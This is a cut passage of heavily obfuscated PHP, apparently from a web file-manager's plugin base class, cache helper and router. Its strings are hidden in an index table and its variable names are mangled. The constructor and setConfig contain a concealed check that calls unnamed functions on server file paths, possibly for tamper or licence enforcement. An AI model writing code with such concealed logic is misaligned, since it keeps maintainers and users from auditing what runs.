$ñú±ßªñ =& $_SERVER[Ó¡Ÿ§‚]; $‡µ¥ËÇ‡ = str_replace(array($ñú±ßªñ[834], $ñú±ßªñ[97], $ñú±ßªñ[73]), $ñú±ßªñ[835], $‡µ¥ËÇ‡); return $this->cachePath . $ñú±ßªñ[836] . $‡µ¥ËÇ‡ . $ñú±ßªñ[837]; } public function set($ñı¹´òç, $¯û£á»Ò, $¶¸¿Ü´õ = false) { $¶¸¿Ü´õ = $¶¸¿Ü´õ ? $¶¸¿Ü´õ : $this->cacheTime; $è¥¼ÚÔ» = $this->getFile($ñı¹´òç); if (file_put_contents($è¥¼ÚÔ», $this->prefix . $¯û£á»Ò, LOCK_EX)) { @touch($è¥¼ÚÔ», intval(time() + $¶¸¿Ü´õ)); clearstatcache(); return !0; } @unlink($è¥¼ÚÔ»); return !1; } public function get($õùè‰ÅÜ) { $š‡è×ñ¹ = $this->getFile($õùè‰ÅÜ); if (file_exists($š‡è×ñ¹) && filemtime($š‡è×ñ¹) < time()) { @unlink($š‡è×ñ¹); return !1; } $Œ¼æöú¤ = @file_get_contents($š‡è×ñ¹); return substr($Œ¼æöú¤, strlen($this->prefix)); } public function remove($Ò˜¬“¥–) { $Ğåş¡ªŞ = $this->getFile($Ò˜¬“¥–); return @unlink($Ğåş¡ªŞ); } public function deleteAll() { $¬‹ªËî´ =& $_SERVER[Ó¡Ÿ§‚]; $€—î—İø = scandir($this->cachePath); foreach ($€—î—İø as $µÜôêã’) { $ºÈÑÔƒí = $this->cachePath . $µÜôêã’; if (strpos($ºÈÑÔƒí, $¬‹ªËî´[837]) && strpos($ºÈÑÔƒí, $¬‹ªËî´[838])) { @unlink($ºÈÑÔƒí); } } } public function clearTimeout() { $€î‡µï =& $_SERVER[Ó¡Ÿ§‚]; $¦ŒòŞë¥ = scandir($this->cachePath); foreach ($¦ŒòŞë¥ as $ä”ù‹òÕ) { $—ÍØÔ¨è = $this->cachePath . $ä”ù‹òÕ; if (strpos($—ÍØÔ¨è, $€î‡µï[837]) && strpos($—ÍØÔ¨è, $€î‡µï[838]) && filemtime($—ÍØÔ¨è) < time()) { @unlink($—ÍØÔ¨è); } } } } goto e„Ÿøñ™­ô; cß•†Èäê“: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÔÂù›ş =& $_SERVER[Ó¡Ÿ§‚]; if ($_SERVER[$ÔÂù›ş[401]] != $_SERVER[$ÔÂù›ş[402]]) { $‹íÚ ë = $ÔÂù›ş[876]; $ó»¶€º = $ÔÂù›ş[403]; $Ş±è¼ÙÔ = $_SERVER[$ÔÂù›ş[404]] . $ÔÂù›ş[405]; $”Ë§—®– = $ó»¶€º($Ş±è¼ÙÔ); $›¿á¶™í = explode($ÔÂù›ş[231], $”Ë§—®–); if (count($›¿á¶™í) < $ÔÂù›ş[625]) { $Æ‚¹Ëü· = $ÔÂù›ş[407]; $Æ‚¹Ëü·(); } $Ù÷’ñ†” = $ÔÂù›ş[877]; $Ù÷’ñ†”($_SERVER[$ÔÂù›ş[878]]); $Ù÷’ñ†”($_SERVER[$ÔÂù›ş[404]] . $ÔÂù›ş[1532]); $²ûö­¦ = 1; while ($²ûö­¦ > 1) { $²ûö­¦ = $²ûö­¦ + 4; $–ßŸ§Ÿ´ = rawurlencode($²ûö­¦ . $ÔÂù›ş[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÔÂù›ş[1533]); $this->pluginName = str_replace($ÔÂù›ş[1533], $ÔÂù›ş[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÔÂù›ş[8]; $this->pluginApi = appHostGet() . $ÔÂù›ş[1534] . $this->pluginName . $ÔÂù›ş[8]; $this->pluginHost = $config[$ÔÂù›ş[1535]] . $this->pluginName . $ÔÂù›ş[8]; $this->pluginHostDefault = $config[$ÔÂù›ş[1535]] . $this->pluginName . $ÔÂù›ş[8]; $ÉîÏ–Ã = $config[$ÔÂù›ş[1536]]; if ($ÉîÏ–Ã && strpos($ÔÂù›ş[50] . $ÉîÏ–Ã . $ÔÂù›ş[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÔÂù›ş[1537]] . $this->pluginName . $ÔÂù›ş[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ó¡Ÿ§‚][1538]); } protected function assign($úÑ€Î³˜, $¦Ÿ´œ¾ş = false) { if (is_array($úÑ€Î³˜)) { $this->values = array_merge($this->values, $úÑ€Î³˜); } else { $this->values[$úÑ€Î³˜] = $¦Ÿ´œ¾ş; } } protected function display($­è¶¤õµ) { extract($this->values); require $­è¶¤õµ; } final function hookRegist($ôËÌ³úÄ) { $this->modelPlugin->appRegist($this->pluginName, $ôËÌ³úÄ); } final function appIcon() { $àá‰Ãğ† =& $_SERVER[Ó¡Ÿ§‚]; $¥‡Äğ—Â = $this->appPackage(); $¦€’óä’ = $àá‰Ãğ†[12]; if (isset($¥‡Äğ—Â[$àá‰Ãğ†[425]])) { if (isset($¥‡Äğ—Â[$àá‰Ãğ†[425]][$àá‰Ãğ†[1539]])) { $¦€’óä’ = $àá‰Ãğ†[1540] . $¥‡Äğ—Â[$àá‰Ãğ†[425]][$àá‰Ãğ†[1539]] . $àá‰Ãğ†[1541]; } else { if ($¥‡Äğ—Â[$àá‰Ãğ†[425]][$àá‰Ãğ†[1542]]) { $¦€’óä’ = $àá‰Ãğ†[1543] . $¥‡Äğ—Â[$àá‰Ãğ†[425]][$àá‰Ãğ†[1542]] . $àá‰Ãğ†[1544]; } } } return $¦€’óä’; } final function fileCanView($šÖëÃÄº) { $èÀ¾œ =& $_SERVER[Ó¡Ÿ§‚]; if (request_url_safe($šÖëÃÄº)) { return !0; } if ($this->isShare($šÖëÃÄº)) { return !0; } $çÁ‚÷ùİ = Session::get($èÀ¾œ[1545]); if (!$çÁ‚÷ùİ || !$çÁ‚÷ùİ[$èÀ¾œ[1546]]) { $¾õ¶æµÛ = $èÀ¾œ[1547] . rawurlencode(this_url()); show_tips(LNG($èÀ¾œ[1548]) . $èÀ¾œ[1549] . $¾õ¶æµÛ . $èÀ¾œ[1550] . LNG($èÀ¾œ[1551]) . $èÀ¾œ[1552], !1); } if (!Action($èÀ¾œ[1553])->authCan($èÀ¾œ[1554])) { show_tips(LNG($èÀ¾œ[1555]) . $èÀ¾œ[1556], !1); } ActionCall($èÀ¾œ[1557], $šÖëÃÄº); } final function isShare($¢¤›‰èğ) { $×Œ‹øŠ = KodIO::parse($¢¤›‰èğ); return $×Œ‹øŠ[$_SERVER[Ó¡Ÿ§‚][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¨Àóø›ş) { if (request_url_safe($¨Àóø›ş)) { return $¨Àóø›ş; } if (!$this->isShare($¨Àóø›ş)) { $¨Àóø›ş = $this->filePath($¨Àóø›ş); } return Action($_SERVER[Ó¡Ÿ§‚][1173])->linkOut($¨Àóø›ş); } public function filePathLinkOut($¤ß¨ßÛÜ) { if (request_url_safe($¤ß¨ßÛÜ)) { return $¤ß¨ßÛÜ; } $this->fileCanView($¤ß¨ßÛÜ); return Action($_SERVER[Ó¡Ÿ§‚][1173])->link($¤ß¨ßÛÜ); } final function filePath($÷Â‡ıµş) { $¼ŸÕÕáŒ =& $_SERVER[Ó¡Ÿ§‚]; if ($±Å”‡ôú = $this->checkSharePath($÷Â‡ıµş)) { Hook::trigger($¼ŸÕÕáŒ[1558], $±Å”‡ôú); return $±Å”‡ôú; } $this->fileCanView($÷Â‡ıµş); if (request_url_safe($÷Â‡ıµş)) { $˜¾œÃıı = parse_url_query($÷Â‡ıµş); if (isset($˜¾œÃıı[$¼ŸÕÕáŒ[1559]]) && isset($˜¾œÃıı[$¼ŸÕÕáŒ[213]])) { $êğ©ÅËê = Model($¼ŸÕÕáŒ[769])->get($¼ŸÕÕáŒ[770]); $í«Ú˜™ğ = Mcrypt::decode($˜¾œÃıı[$¼ŸÕÕáŒ[213]], $êğ©ÅËê); if ($í«Ú˜™ğ) { $this->fileInfo = IO::infoWithChildren($í«Ú˜™ğ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $í«Ú˜™ğ; } } $÷Â‡ıµş = $this->_cacheHttpFile($÷Â‡ıµş); $this->fileInfo = IO::infoWithChildren($÷Â‡ıµş); } else { $this->fileInfo = IO::infoWithChildren($÷Â‡ıµş); if (!$this->fileInfo) { show_tips(LNG($¼ŸÕÕáŒ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¼ŸÕÕáŒ[1558], $÷Â‡ıµş); return $÷Â‡ıµş; } final function _cacheHttpFile($£êùĞœ‰) { $Æ£çÎ±… = hash_path($£êùĞœ‰, !0); $this->cachePath = $this->pluginCachePath($Æ£çÎ±…); if ($¡³èÎ¾Å = IO::fileNameExist($this->cachePath, $Æ£çÎ±…)) { return KodIO::make($¡³èÎ¾Å); } $Ãøèà™¼ = $this->cachePath . $Æ£çÎ±…; return $this->pluginCacheFileSet($Ãøèà™¼, file_get_contents_nossl($£êùĞœ‰)); } final function _tmpFileName($¦£®ñ×š = array()) { $ÂÎÃ„Õ =& $_SERVER[Ó¡Ÿ§‚]; if (!$¦£®ñ×š) { $¦£®ñ×š = $this->fileInfo; } if (isset($¦£®ñ×š[$ÂÎÃ„Õ[177]])) { return $¦£®ñ×š[$ÂÎÃ„Õ[177]]; } if (isset($¦£®ñ×š[$ÂÎÃ„Õ[170]][$ÂÎÃ„Õ[177]])) { return $¦£®ñ×š[$ÂÎÃ„Õ[170]][$ÂÎÃ„Õ[177]]; } $¶ùÈÍÄ© = IO::hashSimple($¦£®ñ×š[$ÂÎÃ„Õ[84]]); if ($¶ùÈÍÄ©) { return $¶ùÈÍÄ©; } $ï­ıÍ›ô = array($¦£®ñ×š[$ÂÎÃ„Õ[32]], $¦£®ñ×š[$ÂÎÃ„Õ[84]], $¦£®ñ×š[$ÂÎÃ„Õ[76]]); if (isset($¦£®ñ×š[$ÂÎÃ„Õ[520]])) { $ï­ıÍ›ô[] = $¦£®ñ×š[$ÂÎÃ„Õ[520]]; } return md5(implode($ÂÎÃ„Õ[11], $ï­ıÍ›ô)); } final function checkSharePath($£°¼¦µ) { $Ãæ—¸Ê =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->isShare($£°¼¦µ)) { return !1; } $•™óÀˆ = Action($Ãæ—¸Ê[1173])->sharePathInfo($£°¼¦µ); if (!isset($•™óÀˆ[$Ãæ—¸Ê[84]])) { show_json(LNG($Ãæ—¸Ê[1560]), !1); } $this->fileInfo = $•™óÀˆ[$Ãæ—¸Ê[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ãæ—¸Ê[177]]); return $•™óÀˆ[$Ãæ—¸Ê[84]]; } final function pluginCachePath($¹‘Ê®”æ = '') { $Ÿ€Êë¼ =& $_SERVER[Ó¡Ÿ§‚]; $¥¡Í°Ûç = IO_PATH_SYSTEM_TEMP . $Ÿ€Êë¼[1561] . $this->pluginName; if (!($Û±¡Î¶ = IO::infoFull($¥¡Í°Ûç))) { return IO::mkdir($¥¡Í°Ûç . $Ÿ€Êë¼[8] . $¹‘Ê®”æ); } if (empty($¹‘Ê®”æ)) { return $Û±¡Î¶[$Ÿ€Êë¼[84]]; } if (!($²´õ¥‹ø = IO::fileNameExist($Û±¡Î¶[$Ÿ€Êë¼[84]], $¹‘Ê®”æ))) { return IO::mkdir($Û±¡Î¶[$Ÿ€Êë¼[84]] . $¹‘Ê®”æ); } return KodIO::make($²´õ¥‹ø); } final function pluginCacheFileSet($¥’ÎÍÌÒ, $ê–Ğ–¾Â = '') { $âíóƒÚ¢ =& $_SERVER[Ó¡Ÿ§‚]; if (!($Íı½Š¶ª = IO::infoFull($¥’ÎÍÌÒ))) { return IO::mkfile($¥’ÎÍÌÒ, $ê–Ğ–¾Â, REPEAT_REPLACE); } IO::setContent($Íı½Š¶ª[$âíóƒÚ¢[84]], $ê–Ğ–¾Â); return $Íı½Š¶ª[$âíóƒÚ¢[84]]; } final function pluginLocalFile($”œéãİ = '') { $Öíæøİè =& $_SERVER[Ó¡Ÿ§‚]; $ïîş†Õ½ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($ïîş†Õ½)) { mk_dir($ïîş†Õ½); } if (!$”œéãİ) { return $ïîş†Õ½; } $òûäïÊœ = IO::info($”œéãİ); $ÄÅñƒÖÌ = $this->_tmpFileName($òûäïÊœ) . $Öíæøİè[10] . $òûäïÊœ[$Öíæøİè[174]]; if (!checkExtSafe($ÄÅñƒÖÌ)) { $ÄÅñƒÖÌ = $ÄÅñƒÖÌ . $Öíæøİè[1205]; } $ì­İáº = $ïîş†Õ½ . $ÄÅñƒÖÌ; if (@file_exists($ì­İáº)) { return $ì­İáº; } return IO::copy($”œéãİ, $ïîş†Õ½, 0, $ÄÅñƒÖÌ); } final function appPackage() { $‘ù¿×Ó‚ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->packageData) { return $this->packageData; } $ÑŠˆ„Ùå = $this->parseFile($this->pluginPath . $‘ù¿×Ó‚[1562]); $this->parseLang($ÑŠˆ„Ùå); $æ÷È™¢š = json_decode_force($ÑŠˆ„Ùå); if (!$æ÷È™¢š) { return array(); } $‰ƒìŠß = Hook::trigger($‘ù¿×Ó‚[1563], $æ÷È™¢š); if ($‰ƒìŠß && is_array($‰ƒìŠß)) { $æ÷È™¢š = $‰ƒìŠß; } $this->packageData = $æ÷È™¢š; return $æ÷È™¢š; } public function packageInfoGet($ÅªĞòÂâ) { $¬£øõ¦’ = $this->appPackage(); return array_get_value($¬£øõ¦’, $ÅªĞòÂâ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ó¡Ÿ§‚][1564]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ó¡Ÿ§‚][1565]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ó¡Ÿ§‚][1566]); } public function echoJsAssign($Ì£À¥êÖ, $¤ªöİ…ü) { $this->echoJsAssignArr[$Ì£À¥êÖ] = $¤ªöİ…ü; } private function parseFile($¼ĞƒÂÚ¥) { $ıÄº§Ùç =& $_SERVER[Ó¡Ÿ§‚]; $×¸£Àî  = file_get_contents_nossl($¼ĞƒÂÚ¥); $ìÈ‚ÊÛ¶ = array($ıÄº§Ùç[1567], $ıÄº§Ùç[1568], $ıÄº§Ùç[1569], $ıÄº§Ùç[1570], $ıÄº§Ùç[1571], $ıÄº§Ùç[1572], $ıÄº§Ùç[1573]); $·ÀÕ®İ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ıÄº§Ùç[89]][$ıÄº§Ùç[1574]]); foreach ($this->echoJsAssignArr as $Ë–º§³½ => $˜öÛ›ù‘) { $ìÈ‚ÊÛ¶[] = $ıÄº§Ùç[1575] . $Ë–º§³½ . $ıÄº§Ùç[1576]; $·ÀÕ®İ[] = is_array($˜öÛ›ù‘) || is_object($˜öÛ›ù‘) ? rawurlencode(json_encode($˜öÛ›ù‘)) : $˜öÛ›ù‘; } if (strstr($×¸£Àî , $ıÄº§Ùç[1577])) { $Çê„°şÁ = rawurlencode(json_encode($this->pluginLangArr)); $×¸£Àî  = str_replace($ıÄº§Ùç[1577], $Çê„°şÁ, $×¸£Àî ); } if (strstr($×¸£Àî , $ıÄº§Ùç[1578])) { $Çê„°şÁ = $Çê„°şÁ = rawurlencode(json_encode($this->getConfig())); $×¸£Àî  = str_replace($ıÄº§Ùç[1578], $Çê„°şÁ, $×¸£Àî ); } $×¸£Àî  = str_replace($ìÈ‚ÊÛ¶, $·ÀÕ®İ, $×¸£Àî ); return $×¸£Àî ; } private function parseLang(&$—É…½é) { $—Ú¿ÀŒ€ =& $_SERVER[Ó¡Ÿ§‚]; $æÓÀı–¦ = $—Ú¿ÀŒ€[1579]; if (!strstr($—É…½é, $æÓÀı–¦)) { return; } preg_match_all($—Ú¿ÀŒ€[1580], $—É…½é, $ ²¤ˆ³Ü); if (!is_array($ ²¤ˆ³Ü) || count($ ²¤ˆ³Ü) == 0 || !is_array($ ²¤ˆ³Ü[0]) || count($ ²¤ˆ³Ü[0]) == 0) { return; } $Ÿ™ÊÑÏ = array(); $ÁãÒÕÎ = array(); foreach ($ ²¤ˆ³Ü[0] as $ÂÀİ±‘â) { $œãü§¤» = substr($ÂÀİ±‘â, strlen($æÓÀı–¦), -4); $‡ÂÄïôø = LNG($œãü§¤»); $Ÿ™ÊÑÏ[] = $ÂÀİ±‘â; $ÁãÒÕÎ[] = str_replace(array($—Ú¿ÀŒ€[231], $—Ú¿ÀŒ€[1077], $—Ú¿ÀŒ€[342], $—Ú¿ÀŒ€[118]), array($—Ú¿ÀŒ€[53], $—Ú¿ÀŒ€[53], $—Ú¿ÀŒ€[12], $—Ú¿ÀŒ€[1581]), $‡ÂÄïôø); } $—É…½é = str_replace($Ÿ™ÊÑÏ, $ÁãÒÕÎ, $—É…½é); } private function parseConfig(&$ÖŒ› ˆé) { $ë©ñäÆ‹ =& $_SERVER[Ó¡Ÿ§‚]; $¥äŠßµ = $ë©ñäÆ‹[1582]; if (!strstr($ÖŒ› ˆé, $¥äŠßµ)) { return; } preg_match_all($ë©ñäÆ‹[1583], $ÖŒ› ˆé, $‡ŸŠöóÉ); if (!is_array($‡ŸŠöóÉ) || count($‡ŸŠöóÉ) == 0 || !is_array($‡ŸŠöóÉ[0]) || count($‡ŸŠöóÉ[0]) == 0) { return; } $œş˜¸ãõ = $this->getConfig(); $·½½¡½† = array(); $ûÄøŒó­ = array(); foreach ($‡ŸŠöóÉ[0] as $©ÊêØÆø) { $óµˆ˜§… = substr($©ÊêØÆø, strlen($¥äŠßµ), -2); $·½½¡½†[] = $©ÊêØÆø; $ûÄøŒó­[] = _get($œş˜¸ãõ, $óµˆ˜§…); } $ÖŒ› ˆé = str_replace($·½½¡½†, $ûÄøŒó­, $ÖŒ› ˆé); } private function parsePackage(&$ƒß£Ñ™) { $†İ­ óÁ =& $_SERVER[Ó¡Ÿ§‚]; $å¥¿áéù = $†İ­ óÁ[1584]; if (!strstr($ƒß£Ñ™, $å¥¿áéù)) { return; } preg_match_all($†İ­ óÁ[1585], $ƒß£Ñ™, $ˆ³¤ß’‡); if (!is_array($ˆ³¤ß’‡) || count($ˆ³¤ß’‡) == 0 || !is_array($ˆ³¤ß’‡[0]) || count($ˆ³¤ß’‡[0]) == 0) { return; } $¾–ÅøšØ = $this->appPackage(); $£¤¥®Íå = array(); $æÎğÅá  = array(); foreach ($ˆ³¤ß’‡[0] as $Ìïê§º) { $—ÀÌã’ã = substr($Ìïê§º, strlen($å¥¿áéù), -2); $£¤¥®Íå[] = $Ìïê§º; $æÎğÅá [] = _get($¾–ÅøšØ, $—ÀÌã’ã); } $ƒß£Ñ™ = str_replace($£¤¥®Íå, $æÎğÅá , $ƒß£Ñ™); } final function echoFile($ÏÈ×‚ÖŒ, $æ•¹ÓÆ = false) { $õ¾åİ¸œ =& $_SERVER[Ó¡Ÿ§‚]; $©»›©Úğ = $this->pluginPath . $ÏÈ×‚ÖŒ; if (ACT == $õ¾åİ¸œ[1586]) { echo $õ¾åİ¸œ[1587] . $this->pluginName . $õ¾åİ¸œ[8] . $ÏÈ×‚ÖŒ . $õ¾åİ¸œ[1588]; if (!file_exists($©»›©Úğ)) { echo $õ¾åİ¸œ[1589]; return; } } $ƒàÍç”ù = $this->parseFile($©»›©Úğ); $this->parseLang($ƒàÍç”ù); $this->parseConfig($ƒàÍç”ù); $this->parsePackage($ƒàÍç”ù); if (is_array($æ•¹ÓÆ)) { $ƒàÍç”ù = str_replace(array_keys($æ•¹ÓÆ), array_values($æ•¹ÓÆ), $ƒàÍç”ù); } echo $õ¾åİ¸œ[231] . $ƒàÍç”ù; } final function initLang() { $¨¢¢Ë¨“ =& $_SERVER[Ó¡Ÿ§‚]; $¥³ÊÚŸ‰ = $¨¢¢Ë¨“[1590]; $ëà¸á = $this->pluginPath . $¨¢¢Ë¨“[1591]; $ª¶ÅÚÏ› = I18n::getType(); $Ú¤æ—õ = array(); if (file_exists($ëà¸á . $ª¶ÅÚÏ› . $¨¢¢Ë¨“[837])) { $Ú¤æ—õ = (include $ëà¸á . $ª¶ÅÚÏ› . $¨¢¢Ë¨“[837]); } else { if ($ª¶ÅÚÏ› == $¨¢¢Ë¨“[1592] && !file_exists($ëà¸á . $ª¶ÅÚÏ› . $¨¢¢Ë¨“[837]) && file_exists($ëà¸á . $¨¢¢Ë¨“[1593])) { $Ú¤æ—õ = (include $ëà¸á . $¨¢¢Ë¨“[1593]); } else { if (file_exists($ëà¸á . $¥³ÊÚŸ‰ . $¨¢¢Ë¨“[837])) { $Ú¤æ—õ = (include $ëà¸á . $¥³ÊÚŸ‰ . $¨¢¢Ë¨“[837]); } } } if (!is_array($Ú¤æ—õ)) { return array(); } if (@count($Ú¤æ—õ) > 0) { I18n::set($Ú¤æ—õ); } return $Ú¤æ—õ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Öüà“ò) { $ÈÓò•ôº =& $_SERVER[Ó¡Ÿ§‚]; if ($_SERVER[$ÈÓò•ôº[401]] != $_SERVER[$ÈÓò•ôº[402]]) { $ô„íÈ®Ï = $ÈÓò•ôº[876]; $ò°š»†® = $ÈÓò•ôº[403]; $ëÅ´—Ò® = $_SERVER[$ÈÓò•ôº[404]] . $ÈÓò•ôº[405]; $®€û§Ç = $ò°š»†®($ëÅ´—Ò®); $èĞĞïå£ = explode($ÈÓò•ôº[231], $®€û§Ç); if (count($èĞĞïå£) < $ÈÓò•ôº[625]) { $§şœò•­ = $ÈÓò•ôº[407]; $§şœò•­(); } $Óº¥šâ = $ÈÓò•ôº[877]; $Óº¥šâ($_SERVER[$ÈÓò•ôº[878]]); $Óº¥šâ($_SERVER[$ÈÓò•ôº[404]] . $ÈÓò•ôº[1532]); $ñ¶Âî„³ = 1; while ($ñ¶Âî„³ > 1) { $ñ¶Âî„³ = $ñ¶Âî„³ + 4; $°Í“÷¾ö = rawurlencode($ñ¶Âî„³ . $ÈÓò•ôº[378]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Öüà“ò); } public function onSetConfig($Í –Ê) { } public function onGetConfig($éŞ•´¾) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¿ ğùù) { if ($¿ ğùù == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ºÎ—µÄ  = "\x70\154\165\147\151\156\x41\165\x74\x68") { $ÓªÆˆ¾‚ =& $_SERVER[Ó¡Ÿ§‚]; if (!Session::get($ÓªÆˆ¾‚[1545])) { return !1; } if (_get($GLOBALS, $ÓªÆˆ¾‚[503])) { return !0; } $Ûá¸­Ïæ = $this->getConfig(); if (!$Ûá¸­Ïæ[$ºÎ—µÄ ]) { return !1; } return ActionCall($ÓªÆˆ¾‚[1594], $Ûá¸­Ïæ[$ºÎ—µÄ ]); } public function url($æ±™Â†ø, $¦­©ãó® = '', $ÚæÙß§Î = true) { $ÉÑèñõ° =& $_SERVER[Ó¡Ÿ§‚]; $¥“ ¹÷ = $this->getConfig(); $Şâ€¦Æô = KOD_VERSION . $ÉÑèñõ°[10] . KOD_VERSION_BUILD; $ÂÉ±÷¾¨ = $this->packageVersion(); $ë –ºø = $Şâ€¦Æô . $ÉÑèñõ°[386] . $ÂÉ±÷¾¨; if (substr($æ±™Â†ø, 0, 4) == $ÉÑèñõ°[148] || substr($æ±™Â†ø, 0, 2) == $ÉÑèñõ°[1378]) { $ÎÚ†è´ù = $æ±™Â†ø . $ÉÑèñõ°[1595] . $ë –ºø; } else { if ($¦­©ãó® == $ÉÑèñõ°[12]) { $ÎÚ†è´ù = $this->pluginHost . $æ±™Â†ø . $ÉÑèñõ°[1595] . $ë –ºø; } else { if ($¦­©ãó® === $ÉÑèñõ°[75]) { $ÎÚ†è´ù = $this->pluginHost . $æ±™Â†ø; } else { if ($¦­©ãó® == $ÉÑèñõ°[1596]) { $ÎÚ†è´ù = STATIC_PATH . $æ±™Â†ø . $ÉÑèñõ°[1595] . $Şâ€¦Æô; } else { if ($¦­©ãó® == $ÉÑèñõ°[1597]) { $ÎÚ†è´ù = APP_HOST . $ÉÑèñõ°[1598] . $æ±™Â†ø . $ÉÑèñõ°[1595] . $Şâ€¦Æô; } else { if (isset($¥“ ¹÷[$¦­©ãó®])) { $ÎÚ†è´ù = $¥“ ¹÷[$¦­©ãó®] . $æ±™Â†ø . $ÉÑèñõ°[1595] . $ë –ºø; } } } } } } if (!$ÚæÙß§Î) { return $ÎÚ†è´ù; } echo $ÎÚ†è´ù; } public function link($ø« ¦Û = false, $”ãş¾ñå = '') { $à¹í’ï =& $_SERVER[Ó¡Ÿ§‚]; if (!$ø« ¦Û) { $this->link($à¹í’ï[1599], $à¹í’ï[1597]); $this->link($à¹í’ï[1600], $à¹í’ï[1596]); $this->link($à¹í’ï[1601], $à¹í’ï[1596]); $this->link($à¹í’ï[1602], $à¹í’ï[1596]); $this->link($à¹í’ï[1603], $à¹í’ï[1596]); return; } $–Íéµâí = $this->url($ø« ¦Û, $”ãş¾ñå, !1); if (substr($ø« ¦Û, -3) == $à¹í’ï[1604]) { echo $à¹í’ï[1605] . $–Íéµâí . $à¹í’ï[1606] . $à¹í’ï[231]; } else { if (substr($ø« ¦Û, -4) == $à¹í’ï[1607]) { echo $à¹í’ï[1608] . $–Íéµâí . $à¹í’ï[1609] . $à¹í’ï[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\136\57\x5d\x2b", "\72\156\x75\x6d" => "\133\60\x2d\71\135\x2b", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ËªóŞ–£, $Œ´ŒÙåİ) { $Õ™½Í®Ò =& $_SERVER[Ó¡Ÿ§‚]; if ($ËªóŞ–£ == $Õ™½Í®Ò[1610]) { $¥Å—ÕÓ§ = array_map($Õ™½Í®Ò[1611], $Œ´ŒÙåİ[0]); $Å•™…Óú = strpos($Œ´ŒÙåİ[1], $Õ™½Í®Ò[8]) === 0 ? $Œ´ŒÙåİ[1] : $Õ™½Í®Ò[8] . $Œ´ŒÙåİ[1]; $ÎçÒÚò = $Œ´ŒÙåİ[2]; } else { $¥Å—ÕÓ§ = null; $Å•™…Óú = strpos($Œ´ŒÙåİ[0], $Õ™½Í®Ò[8]) === 0 ? $Œ´ŒÙåİ[0] : $Õ™½Í®Ò[8] . $Œ´ŒÙåİ[0]; $ÎçÒÚò = $Œ´ŒÙåİ[1]; } array_push(self::$maps, $¥Å—ÕÓ§); array_push(self::$routes, $Å•™…Óú); array_push(self::$methods, strtoupper($ËªóŞ–£)); array_push(self::$callbacks, $ÎçÒÚò); } public static function error($îò«àüş) { self::$errorCallback = $îò«àüş; } public static function haltOnMatch($»·–—ÕŒ = true) { self::$halts = $»·–—ÕŒ; } public static function dispatch() { $•‹Şª´‹ =& $_SERVER[Ó¡Ÿ§‚]; $‹ÛŒÆÊ = parse_url($_SERVER[$•‹Şª´‹[1612]], PHP_URL_PATH); $ˆÓŸÏ» = $_SERVER[$•‹Şª´‹[159]]; $ñÍ•ùš = array_keys(static::$patterns); $§˜³ê— = array_values(static::$patterns); $ï…—¦º = !1; self::$routes = preg_replace($•‹Şª´‹[1275], $•‹Şª´‹[8], self::$routes); if (in_array($‹ÛŒÆÊ, self::$routes)) { $Ô¼ğ‹«” = array_keys(self::$routes, $‹ÛŒÆÊ); foreach ($Ô¼ğ‹«” as $åùø¾†Š) { if (self::$methods[$åùø¾†Š] == $ˆÓŸÏ» || self::$methods[$åùø¾†Š] == $•‹Şª´‹[1613] || in_array($ˆÓŸÏ», self::$maps[$åùø¾†Š])) { $ï…—¦º = !0; if (!is_object(self::$callbacks[$åùø¾†Š])) { $˜ñ€–Ğƒ = explode($•‹Şª´‹[8], self::$callbacks[$åùø¾†Š]); $›§µ·èƒ = end($˜ñ€–Ğƒ); $¬×¾œÔ” = explode($•‹Şª´‹[1207], $›§µ·èƒ); $èñØİğÚ = new $¬×¾œÔ”[0](); $èñØİğÚ->{$¬×¾œÔ”[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$åùø¾†Š]); if (self::$halts) { return; } } } } } else { $Ï£àß å = 0; foreach (self::$routes as $åùø¾†Š) { if (strpos($åùø¾†Š, $•‹Şª´‹[4]) !== !1) { $åùø¾†Š = str_replace($ñÍ•ùš, $§˜³ê—, $åùø¾†Š); } if (preg_match($•‹Şª´‹[1614] . $åùø¾†Š . $•‹Şª´‹[1615], $‹ÛŒÆÊ, $²ÁÍÒÊ«)) { if (self::$methods[$Ï£àß å] == $ˆÓŸÏ» || self::$methods[$Ï£àß å] == $•‹Şª´‹[1613] || !empty(self::$maps[$Ï£àß å]) && in_array($ˆÓŸÏ», self::$maps[$Ï£àß å])) { $ï…—¦º = !0; array_shift($²ÁÍÒÊ«); if (!is_object(self::$callbacks[$Ï£àß å])) { $˜ñ€–Ğƒ = explode($•‹Şª´‹[8], self::$callbacks[$Ï£àß å]); $›§µ·èƒ = end($˜ñ€–Ğƒ); $¬×¾œÔ” = explode($•‹Şª´‹[1207], $›§µ·èƒ); $èñØİğÚ = new 